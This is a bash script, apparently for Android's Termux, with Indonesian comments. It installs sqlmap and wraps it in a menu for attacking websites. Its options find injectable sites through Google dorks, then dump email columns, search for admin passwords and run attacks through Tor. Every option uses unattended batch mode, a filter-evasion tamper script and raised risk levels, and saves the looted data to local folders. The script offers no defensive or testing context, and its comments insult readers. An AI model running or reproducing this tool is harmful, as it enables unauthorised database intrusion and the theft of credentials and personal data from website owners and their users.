#!/usr/bin/bash
#Mau ngaopain tolo !!!!!!!!!
#jan di recode gblk gw capek bikin nya !!!!
clear
pkg install python2 -y
pkg install toilet -y
pkg install figlet -y
pkg install git -y
git clone https://github.com/sqlmapproject/sqlmap
cd sqlmap
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
toilet -f graffiti.flf Sqlbot --gay
echo ""
echo "<==========================================>"
echo "Coder : Fajar Firdaus"
echo "Fb : https://www.facebook.com/Ace.of.spades729"
echo "IG : fajar_firdaus_7"
echo "YT : iTech7732"
echo "<==========================================>"
echo ""
echo "[#]=======================================[#]"
echo "1.> Hack Database Dengan Dork"
echo "2.> Auto Dump Email "
echo "3.> Cari Password admin"
echo "4.> Hack Database dengan tor"
echo "[#]=======================================[#]"
echo ""
read -p "root@Sqlbot-#" bcd

if [ $bcd = 1 ] || [ $bcd = 1 ]
then
clear
read -e "Masukan Dork : "
read dork
python2 sqlmap.py -g $dork --dbs --batch --tamper=space2comment --keep-alive --risk=2 --level=2 --smart --flush-session --output=Hasil
echo "Done! Lihat Hasil Dump di folder Hasil"
fi

if [ $bcd = 2 ] || [ $bcd = 2]
then
clear
read -e "Masukan Hostname Website"
read host
python2 sqlmap.py -u $host --dbs --batch --tamper=space2comment --risk=2 --level=2 --flush-session --search -C mail --output=Hasil_Mail
echo "Done! Lihat Hasil Dump di folder Hasil_Mail"
fi

if [ $bcd = 3 ] || [ $bcd = 3 ]
then
clear
read -e "Masukan Hostname Website"
read host
python2 sqlmap.py -u $host --dbs --batch --tamper=space2comment --search -C admin,password --level=2 --risk=2 --output=Hasil_Admin_Password
echo "Done! Lihat Hasil Dump di folder Hasil_Admin_Password"
fi

if [ $bcd = 4 ] || [ $bcd = 4 ]
then
clear
read -e "Masukan Hostname Website"
read host
python2 sqlmap.py -u $host --dbs --batch --tor --tamper=space2comment --risk=2 --level=2
fi
